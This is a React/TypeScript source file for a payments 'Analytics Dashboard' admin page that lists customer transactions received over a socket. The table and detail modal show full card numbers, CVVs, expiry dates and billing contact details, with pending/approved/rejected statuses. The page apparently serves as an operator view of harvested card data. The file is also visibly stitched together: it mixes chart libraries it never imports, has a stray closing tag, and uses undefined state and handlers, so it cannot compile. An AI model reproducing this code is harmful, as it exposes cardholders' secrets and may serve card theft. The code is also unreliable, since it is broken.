import React, { useState, useEffect, useMemo } from 'react';
import { motion } from 'framer-motion';
import { 
  LineChart, Line, BarChart, Bar, PieChart, Pie, Cell, 
  ResponsiveContainer, XAxis, YAxis, CartesianGrid, Tooltip, Legend 
} from 'recharts';
import { 
  DollarSign, CreditCard, Users, TrendingUp, ArrowLeft, RefreshCw, 
  Download, Calendar, Filter, Eye, Search, MoreHorizontal 
} from 'lucide-react';
import { useSocket } from '../context/SocketContext';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { format, subDays } from 'date-fns';

// TypeScript Interfaces
interface PaymentData {
  id: string;
  paymentId: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    address: string;
    city: string;
    zipCode: string;
    country: string;
    state: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
  cardCountry?: { name: string; code: string; flag: string; };
  currency?: string;
}

interface AnalyticsData {
  overview: { totalPayments: number; totalRevenue: number; avgPaymentValue: number; monthGrowth: number; };
  breakdown: { currency: { [key: string]: { count: number; revenue: number } }; country: { [key: string]: { count: number; revenue: number } }; };
  trends: { daily: Array<{ date: string; count: number; revenue: number }>; };
  insights: { peakHour: number; peakHourRevenue: number; topCountry: string; topCurrency: string; };
}

// Reusable Animated Card Component
const StatCard = ({ title, value, icon, trend }) => (
  <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
    <Card className="bg-gray-800/50 border-gray-700/50 backdrop-blur-sm hover:bg-gray-800/80 transition-colors duration-300">
      <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
        <CardTitle className="text-sm font-medium text-gray-400">{title}</CardTitle>
        {icon}
      </CardHeader>
      <CardContent>
        <div className="text-2xl font-bold text-white">{value}</div>
        <p className="text-xs text-green-400">{trend}</p>
      </CardContent>
    </Card>
  </motion.div>
);

const AnalyticsPage: React.FC = () => {
  const navigate = useNavigate();
  const { socket } = useSocket();
  
  const [analyticsData, setAnalyticsData] = useState<AnalyticsData | null>(null);
  const [payments, setPayments] = useState<PaymentData[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [dateRange, setDateRange] = useState('30'); // '7', '30', '90', 'all'
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedPayment, setSelectedPayment] = useState<PaymentData | null>(null);

  useEffect(() => {
    if (!socket) return;

    const handleAnalytics = (data) => {
      setAnalyticsData(data);
      setIsLoading(false);
    };
    const handlePayments = (data) => setPayments(data);

    socket.on('analytics-data', handleAnalytics);
    socket.on('payments-data', handlePayments);
    socket.on('analytics-update', (data) => setAnalyticsData(data));
    socket.on('payment-received', (newPayment) => setPayments(prev => [newPayment, ...prev]));

    // Initial data fetch
    socket.emit('get-analytics-data');
    socket.emit('get-payments-data');

    return () => {
      socket.off('analytics-data', handleAnalytics);
      socket.off('payments-data', handlePayments);
      socket.off('analytics-update');
      socket.off('payment-received');
    };
  }, [socket]);

  const filteredPayments = useMemo(() => {
    const now = new Date();
    let startDate = new Date(0);
    if (dateRange !== 'all') {
      startDate = subDays(now, parseInt(dateRange));
    }
    return payments
      .filter(p => new Date(p.timestamp) >= startDate)
      .filter(p => searchTerm ? p.billingDetails.email.toLowerCase().includes(searchTerm.toLowerCase()) || p.cardName.toLowerCase().includes(searchTerm.toLowerCase()) : true);
  }, [payments, dateRange, searchTerm]);

  const formatCurrency = (amount: number, currency: string = 'INR') => new Intl.NumberFormat('en-US', { style: 'currency', currency }).format(amount);

  const trendData = useMemo(() => {
    if (!analyticsData) return [];
    return analyticsData.trends.daily.map(d => ({ 
      date: format(new Date(d.date), 'MMM dd'), 
      Revenue: d.revenue 
    }));
  }, [analyticsData]);

  const countryData = useMemo(() => {
    if (!analyticsData) return [];
    return Object.entries(analyticsData.breakdown.country)
      .map(([name, { revenue }]) => ({ name, value: revenue }))
      .sort((a, b) => b.value - a.value)
      .slice(0, 5);
  }, [analyticsData]);

  const COLORS = ['#8884d8', '#82ca9d', '#ffc658', '#ff8042', '#0088FE'];

  const exportToCSV = () => {
    const headers = ['ID', 'Date', 'Customer', 'Amount', 'Currency', 'Status'];
    const rows = filteredPayments.map(p => [
      p.id,
      new Date(p.timestamp).toLocaleString(),
      p.cardName,
      p.amount,
      p.currency || 'INR',
      p.status
    ].join(','));
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows].join('\n');
    const link = document.createElement('a');
    link.setAttribute('href', encodeURI(csvContent));
    link.setAttribute('download', `payments-${dateRange}days.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (isLoading) {
    return <div className="flex items-center justify-center h-screen bg-gray-900 text-white"><RefreshCw className="animate-spin mr-2"/> Loading Analytics...</div>;
  }

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.8 }} className="min-h-screen bg-gradient-to-br from-gray-900 to-slate-800 text-white p-4 sm:p-6 lg:p-8">
      <div className="max-w-screen-xl mx-auto">
        <header className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8">
          <div>
            <button onClick={() => navigate('/admin')} className="flex items-center text-gray-400 hover:text-white mb-2 transition-colors">
              <ArrowLeft size={16} className="mr-2" /> Back to Admin Panel
            </button>
            <h1 className="text-4xl font-bold tracking-tight">Analytics Dashboard</h1>
          </div>
          <div className="flex items-center space-x-2 mt-4 sm:mt-0">
            <Button variant="outline" onClick={() => socket?.emit('get-analytics-data')}><RefreshCw size={16} className="mr-2" /> Refresh</Button>
            <Button onClick={exportToCSV}><Download size={16} className="mr-2" /> Export</Button>
          </div>
        </header>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <StatCard title="Total Revenue" value={formatCurrency(analyticsData?.overview.totalRevenue || 0)} icon={<DollarSign className="h-4 w-4 text-green-400" />} trend={`+${(analyticsData?.overview.monthGrowth || 0).toFixed(1)}% this month`} />
          <StatCard title="Total Payments" value={(analyticsData?.overview.totalPayments || 0).toLocaleString()} icon={<CreditCard className="h-4 w-4 text-blue-400" />} trend="All-time" />
          <StatCard title="Avg. Payment" value={formatCurrency(analyticsData?.overview.avgPaymentValue || 0)} icon={<TrendingUp className="h-4 w-4 text-purple-400" />} trend="All-time average" />
          <StatCard title="Top Country" value={analyticsData?.insights.topCountry || 'N/A'} icon={<Users className="h-4 w-4 text-yellow-400" />} trend="By revenue" />
        </div>
            </Card>

            {/* Hourly Payments */}
            <Card>
              <CardHeader>
                <CardTitle>⏰ Hourly Payment Distribution</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Bar 
                    data={{
                      labels: analyticsData.trends.hourly.map(h => `${h.hour}:00`),
                      datasets: [{
                        label: 'Payments',
                        data: analyticsData.trends.hourly.map(h => h.count),
                        backgroundColor: 'rgba(34, 197, 94, 0.8)',
                        borderColor: 'rgb(34, 197, 94)',
                        borderWidth: 1,
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>

            {/* Currency Breakdown */}
            <Card>
              <CardHeader>
                <CardTitle>💱 Revenue by Currency</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Doughnut 
                    data={{
                      labels: Object.keys(analyticsData.breakdown.currency),
                      datasets: [{
                        data: Object.values(analyticsData.breakdown.currency).map(c => c.revenue),
                        backgroundColor: ['#3B82F6', '#EF4444', '#10B981', '#F59E0B'],
                        borderWidth: 2,
                        borderColor: '#ffffff',
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>

            {/* Country Distribution */}
            <Card>
              <CardHeader>
                <CardTitle>🌍 Payments by Country</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Pie 
                    data={{
                      labels: Object.keys(analyticsData.breakdown.country).slice(0, 5),
                      datasets: [{
                        data: Object.values(analyticsData.breakdown.country).slice(0, 5).map(c => c.count),
                        backgroundColor: ['#06B6D4', '#84CC16', '#F97316', '#EC4899', '#6366F1'],
                        borderWidth: 2,
                        borderColor: '#ffffff',
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Filters Section */}
        <Card>
          <CardHeader>
            <CardTitle>🔍 Transaction Filters</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-6 gap-4">
              {/* Search */}
              <div className="lg:col-span-2">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    placeholder="Search transactions..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pl-10 bg-gray-800 border-gray-600 text-white"
                  />
                </div>
              </div>

              {/* Status Filter */}
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Status" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Status</SelectItem>
                  <SelectItem value="pending" className="text-white">Pending</SelectItem>
                  <SelectItem value="approved" className="text-white">Approved</SelectItem>
                  <SelectItem value="rejected" className="text-white">Rejected</SelectItem>
                </SelectContent>
              </Select>

              {/* Currency Filter */}
              <Select value={currencyFilter} onValueChange={setCurrencyFilter}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Currency" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Currencies</SelectItem>
                  <SelectItem value="INR" className="text-white">🇮🇳 INR</SelectItem>
                  <SelectItem value="USD" className="text-white">🇺🇸 USD</SelectItem>
                </SelectContent>
              </Select>

              {/* Date Range Filter */}
              <Select value={dateRange} onValueChange={setDateRange}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Date Range" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Time</SelectItem>
                  <SelectItem value="today" className="text-white">Today</SelectItem>
                  <SelectItem value="week" className="text-white">This Week</SelectItem>
                  <SelectItem value="month" className="text-white">This Month</SelectItem>
                </SelectContent>
              </Select>

              {/* Results Count */}
              <div className="flex items-center text-sm text-gray-400">
                {filteredPayments.length} transactions found
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Transaction History Table */}
        <Card>
          <CardHeader>
            <CardTitle>💳 Complete Transaction History</CardTitle>
            <p className="text-gray-400">Detailed view of all payment transactions</p>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Date & Time</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Customer</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Card Details</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Amount</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Country</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Status</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {filteredPayments.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="px-4 py-8 text-center text-gray-400">
                        No transactions found
                      </td>
                    </tr>
                  ) : (
                    filteredPayments.map((payment) => (
                      <tr key={payment.id} className="hover:bg-gray-800 transition-colors">
                        <td className="px-4 py-4 text-sm">
                          <div>
                            <div className="font-medium">{new Date(payment.timestamp).toLocaleDateString()}</div>
                            <div className="text-gray-400">{new Date(payment.timestamp).toLocaleTimeString()}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div>
                            <div className="font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
                            <div className="text-gray-400">{payment.billingDetails.email}</div>
                            <div className="text-xs text-gray-500">{payment.billingDetails.phone}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm font-mono">
                          <div>
                            <div className="text-green-400">•••• •••• •••• {payment.cardNumber.slice(-4)}</div>
                            <div className="text-gray-400">{payment.cardName}</div>
                            <div className="text-xs text-gray-500">CVV: {payment.cvv} | Exp: {payment.expiry}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div className="font-medium text-green-400">
                            {formatCurrency(payment.amount, payment.currency)}
                          </div>
                          <div className="text-xs text-gray-400">{payment.planName}</div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div className="flex items-center gap-2">
                            <span>{payment.cardCountry?.flag || '🌍'}</span>
                            <span>{payment.cardCountry?.name || 'Unknown'}</span>
                          </div>
                        </td>
                        <td className="px-4 py-4">
                          <span className={`inline-flex px-2 py-1 text-xs font-medium rounded-full ${
                            payment.status === 'approved' ? 'bg-green-100 text-green-800' :
                            payment.status === 'rejected' ? 'bg-red-100 text-red-800' :
                            'bg-yellow-100 text-yellow-800'
                          }`}>
                            {payment.status}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <Button
                            onClick={() => viewPaymentDetails(payment)}
                            size="sm"
                            variant="outline"
                            className="border-gray-600 text-gray-300 hover:bg-gray-700"
                          >
                            <Eye className="h-4 w-4 mr-1" />
                            View
                          </Button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>

        {/* Payment Details Modal */}
        <Dialog open={showPaymentModal} onOpenChange={setShowPaymentModal}>
          <DialogContent className="max-w-4xl bg-gray-900 border-gray-700 text-white">
            <DialogHeader>
              <DialogTitle>💳 Complete Payment Details</DialogTitle>
            </DialogHeader>
            {selectedPayment && (
              <div className="space-y-6">
                {/* Payment Summary */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 p-4 bg-gray-800 rounded-lg">
                  <div>
                    <h4 className="font-semibold text-green-400">Payment Amount</h4>
                    <p className="text-2xl font-bold">{formatCurrency(selectedPayment.amount, selectedPayment.currency)}</p>
                    <p className="text-sm text-gray-400">{selectedPayment.planName}</p>
                  </div>
                  <div>
                    <h4 className="font-semibold text-blue-400">Payment ID</h4>
                    <p className="font-mono text-sm">{selectedPayment.paymentId}</p>
                    <p className="text-sm text-gray-400">{new Date(selectedPayment.timestamp).toLocaleString()}</p>
                  </div>
                  <div>
                    <h4 className="font-semibold text-purple-400">Status</h4>
                    <span className={`inline-flex px-2 py-1 text-sm font-medium rounded-full ${
                      selectedPayment.status === 'approved' ? 'bg-green-100 text-green-800' :
                      selectedPayment.status === 'rejected' ? 'bg-red-100 text-red-800' :
                      'bg-yellow-100 text-yellow-800'
                    }`}>
                      {selectedPayment.status}
                    </span>
                  </div>
                </div>

                {/* Customer Details */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold">👤 Customer Information</h3>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Name:</span> {selectedPayment.billingDetails.firstName} {selectedPayment.billingDetails.lastName}</div>
                      <div><span className="text-gray-400">Email:</span> {selectedPayment.billingDetails.email}</div>
                      <div><span className="text-gray-400">Phone:</span> {selectedPayment.billingDetails.phone}</div>
                      <div><span className="text-gray-400">Company:</span> {selectedPayment.billingDetails.companyName || 'N/A'}</div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold">🏠 Billing Address</h3>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Address:</span> {selectedPayment.billingDetails.address}</div>
                      <div><span className="text-gray-400">City:</span> {selectedPayment.billingDetails.city}</div>
                      <div><span className="text-gray-400">State:</span> {selectedPayment.billingDetails.state}</div>
                      <div><span className="text-gray-400">ZIP:</span> {selectedPayment.billingDetails.zipCode}</div>
                      <div><span className="text-gray-400">Country:</span> {selectedPayment.billingDetails.country}</div>
                    </div>
                  </div>
                </div>

                {/* Card Details */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">💳 Card Information</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4 bg-gray-800 rounded-lg">
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Card Number:</span> <span className="font-mono">{selectedPayment.cardNumber}</span></div>
                      <div><span className="text-gray-400">Cardholder Name:</span> {selectedPayment.cardName}</div>
                      <div><span className="text-gray-400">CVV:</span> <span className="font-mono">{selectedPayment.cvv}</span></div>
                      <div><span className="text-gray-400">Expiry:</span> <span className="font-mono">{selectedPayment.expiry}</span></div>
                    </div>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Card Country:</span> {selectedPayment.cardCountry?.flag} {selectedPayment.cardCountry?.name || 'Unknown'}</div>
                      <div><span className="text-gray-400">Currency:</span> {selectedPayment.currency || 'INR'}</div>
                      <div><span className="text-gray-400">Billing Cycle:</span> {selectedPayment.billing}</div>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default AnalyticsPage;
